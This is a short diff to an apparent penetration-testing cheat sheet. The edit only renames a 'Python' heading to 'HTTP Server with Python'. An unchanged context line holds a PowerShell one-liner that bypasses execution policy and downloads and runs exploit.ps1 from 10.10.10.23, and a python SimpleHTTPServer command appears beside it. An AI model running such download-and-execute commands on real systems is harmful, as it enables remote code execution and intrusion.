@@ -24,7 +24,7 @@
     ```ps1
       powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.23/exploit.ps1');
     ```
-- Python
+- HTTP Server with Python 
   ```bash
     python -m SimpleHTTPServer [PORT] 
   ```
